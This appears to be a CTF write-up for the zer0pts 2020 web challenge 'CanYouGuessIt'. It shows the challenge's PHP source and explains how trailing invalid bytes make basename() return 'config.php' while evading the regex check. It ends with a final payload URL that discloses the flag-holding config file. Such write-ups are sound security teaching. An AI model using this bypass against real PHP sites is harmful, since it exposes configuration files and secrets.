---
title: "CanYouGuessIt - zer0pts 2020"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "canyouguessit", "web-exploitation", "zer0pts", "perfectblue", "ctf-writeups"]
summary: "web writeup for \"CanYouGuessIt\" from zer0pts - techniques: canyouguessit, web-exploitation, zer0pts, perfectblue, ctf-writeups."
source:
  name: "perfectblue/ctf-writeups"
  url: "https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2020/zer0pts-2020/CanYouGuessIt/README.md"
ctf:
  name: "zer0pts"
  year: 2020
  challenge: "CanYouGuessIt"
---

## Source

- **CTF:** zer0pts 2020
- **Challenge:** CanYouGuessIt
- **Repository:** [perfectblue/ctf-writeups](https://github.com/perfectblue/ctf-writeups)
- **File:** <https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2020/zer0pts-2020/CanYouGuessIt/README.md>

---
### Can You Guess It?

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```

- basename() ignores invalid bytes at the end of path (`/config.php/%ff` returns `config.php`)
- Invalid chars at the end of the path bypasses the regex.

Final Payload:
```
http://18.179.178.246:8003/index.php/config.php/%ff?source
```
